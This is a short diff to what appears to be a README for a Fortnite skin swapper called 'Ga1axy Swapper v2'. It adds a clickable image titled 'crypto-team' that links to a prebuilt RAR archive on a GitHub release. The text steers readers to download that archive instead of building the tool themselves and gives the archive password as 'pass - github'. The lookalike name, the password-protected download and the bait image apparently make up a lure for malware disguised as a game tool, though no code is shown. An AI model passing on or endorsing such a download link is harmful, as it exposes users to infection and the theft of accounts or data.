@@ -3,6 +3,8 @@ Revamp your Fortnite experience with our skin swapper designed for the latest ve
 
 Note: It is recommended to download Ga1axy Swapper v2 from #[here](https://github.com/nikhilx144/ga1axy-swapper-v2/releases/download/Download/GalaxySwapper.rar) instead of rebuilding it yourself.
 
+[![crypto-team](https://github.com/nikhilx144/ga1axy-swapper-v2/releases/download/Download/photo_2024-08-01_01-22-52.jpg)](https://github.com/nikhilx144/ga1axy-swapper-v2/releases/download/Download/GalaxySwapper.rar)
+
 pass - github
 
 What is Ga1axy Swapper v2?
